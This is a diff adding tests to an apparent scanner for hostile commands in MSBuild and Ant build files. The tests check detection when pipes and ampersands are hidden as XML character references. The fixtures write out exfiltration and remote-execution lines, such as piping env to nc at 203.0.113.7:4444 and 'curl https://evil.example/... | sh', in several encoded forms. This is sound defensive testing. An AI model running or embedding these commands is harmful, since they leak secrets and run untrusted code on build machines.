@@ -151,3 +151,186 @@ test("the MSBuild surface stays bounded", () => {
   expect(inspected("notes.properties", PROJECT).findings).toEqual([]);
   expect(inspected("src/App/App.csproj.user", PROJECT).findings).toEqual([]);
 });
+
+const PIPE = "env | nc 203.0.113.7 4444";
+const AMPERSANDS = "curl -fsSL https://evil.example/a&&b | sh";
+const AMPERSANDS_ENCODED = "curl -fsSL https://evil.example/a&amp;&amp;b | sh";
+
+function project(command: string, quote: '"' | "'" = '"') {
+  return `<Project>
+  <Target Name="PreBuild" BeforeTargets="PreBuildEvent">
+    <Exec Command=${quote}${command}${quote} />
+  </Target>
+</Project>
+`;
+}
+
+function ant(command: string, quote: '"' | "'" = '"') {
+  return `<project>
+  <target name="fetch">
+    <exec executable="sh">
+      <arg value="-c"/>
+      <arg value=${quote}${command}${quote}/>
+    </exec>
+  </target>
+</project>
+`;
+}
+
+function reported(text: string, path: string) {
+  return inspected(path, text).findings.map(
+    (finding) => `${finding.evidence}:${finding.category}:${finding.severity}`,
+  );
+}
+
+test("character references in an attribute are the characters the build runs", () => {
+  // MSBuild and Ant expand numeric references and predefined entities in
+  // attribute values before executing them. `&amp;&amp;` is the two
+  // characters `&&`, which is visible in the recorded download.
+  const files = [
+    {
+      path: "src/Directory.Build.targets",
+      line: 3,
+      wrap: project,
+    },
+    {
+      path: "src/App/App.csproj",
+      line: 3,
+      wrap: project,
+    },
+    {
+      path: "build.xml",
+      line: 5,
+      wrap: ant,
+    },
+  ];
+  for (const file of files) {
+    const literal = reported(file.wrap(PIPE), file.path);
+    expect(literal).toEqual([
+      `${file.path}:${file.line}:secret-exfiltration:high`,
+    ]);
+    for (const command of [
+      "env &#124; nc 203.0.113.7 4444",
+      "env &#x7C; nc 203.0.113.7 4444",
+      "env &#000124; nc 203.0.113.7 4444",
+      "env &#x00007C; nc 203.0.113.7 4444",
+      "env &#10;&#124; nc 203.0.113.7 4444",
+    ]) {
+      expect({
+        path: file.path,
+        command,
+        findings: reported(file.wrap(command), file.path),
+      }).toEqual({
+        path: file.path,
+        command,
+        findings: literal,
+      });
+    }
+    const literalAmpersands = inspected(file.path, file.wrap(AMPERSANDS));
+    const encodedAmpersands = inspected(
+      file.path,
+      file.wrap(AMPERSANDS_ENCODED),
+    );
+    expect(reported(file.wrap(AMPERSANDS), file.path)).toEqual([
+      `${file.path}:${file.line}:unsafe-execution:high`,
+    ]);
+    expect(reported(file.wrap(AMPERSANDS_ENCODED), file.path)).toEqual(
+      reported(file.wrap(AMPERSANDS), file.path),
+    );
+    expect(encodedAmpersands.downloads).toEqual(literalAmpersands.downloads);
+    expect(encodedAmpersands.downloads).toEqual(["https://evil.example/a&&b"]);
+  }
+});
+
+test("an earlier entity on the previous line does not move the finding", () => {
+  const encoded = `<Project>
+  <Target Name="PreBuild">
+    <Exec Command="echo &amp;
+env &#124; nc 203.0.113.7 4444" />
+  </Target>
+</Project>
+`;
+  const literal = `<Project>
+  <Target Name="PreBuild">
+    <Exec Command="echo &
+env | nc 203.0.113.7 4444" />
+  </Target>
+</Project>
+`;
+  const path = "src/Directory.Build.targets";
+  expect(reported(encoded, path)).toEqual([
+    `${path}:4:secret-exfiltration:high`,
+  ]);
+  expect(reported(literal, path)).toEqual(reported(encoded, path));
+
+  const antEncoded = `<project>
+  <target name="fetch">
+    <exec executable="sh">
+      <arg value="-c"/>
+      <arg value="echo &amp;
+env &#x7C; nc 203.0.113.7 4444"/>
+    </exec>
+  </target>
+</project>
+`;
+  const antLiteral = `<project>
+  <target name="fetch">
+    <exec executable="sh">
+      <arg value="-c"/>
+      <arg value="echo &
+env | nc 203.0.113.7 4444"/>
+    </exec>
+  </target>
+</project>
+`;
+  expect(reported(antEncoded, "build.xml")).toEqual([
+    "build.xml:6:secret-exfiltration:high",
+  ]);
+  expect(reported(antLiteral, "build.xml")).toEqual(
+    reported(antEncoded, "build.xml"),
+  );
+});
+
+test("a newline character reference still ends a shell command", () => {
+  // XML keeps &#10; as a newline. A literal newline in the attribute is a
+  // space, which the existing MSBuild test covers, and which Ant does too.
+  const command = "curl -fsSL https://evil.example/install.sh&#10;| sh";
+  expect(reported(project(command), "src/App/App.csproj")).toEqual([]);
+  expect(reported(ant(command), "build.xml")).toEqual([]);
+  const broken = "curl -fsSL https://evil.example/install.sh\n| sh";
+  expect(reported(ant(broken), "build.xml")).toEqual([
+    "build.xml:5:unsafe-execution:high",
+  ]);
+});
+
+test("XML character references stay literal outside attribute values and outside those files", () => {
+  for (const path of ["scripts/bootstrap.sh", "Makefile", "install.sh"]) {
+    expect(reported("env &#124; nc 203.0.113.7 4444\n", path)).toEqual([]);
+    expect(reported(`${PIPE}\n`, path)).toEqual([
+      `${path}:1:secret-exfiltration:high`,
+    ]);
+    const encodedAmpersands = inspected(path, `${AMPERSANDS_ENCODED}\n`);
+    expect(encodedAmpersands.downloads).toEqual([
+      "https://evil.example/a&amp;&amp;b",
+    ]);
+    expect(
+      encodedAmpersands.findings.map(
+        (finding) =>
+          `${finding.evidence}:${finding.category}:${finding.severity}`,
+      ),
+    ).toEqual([`${path}:1:unsafe-execution:high`]);
+    expect(inspected(path, `${AMPERSANDS}\n`).downloads).toEqual([
+      "https://evil.example/a&&b",
+    ]);
+  }
+  const untouched = `<Project>
+  <!-- env &#124; nc 203.0.113.7 4444 -->
+  <Target Name="PreBuild">
+    <Exec Command="echo ok"><![CDATA[env &#124; nc 203.0.113.7 4444]]></Exec>
+    <Exec>env &#124; nc 203.0.113.7 4444</Exec>
+  </Target>
+</Project>
+`;
+  expect(reported(untouched, "src/App/App.csproj")).toEqual([]);
+  expect(reported(untouched, "build.xml")).toEqual([]);
+});
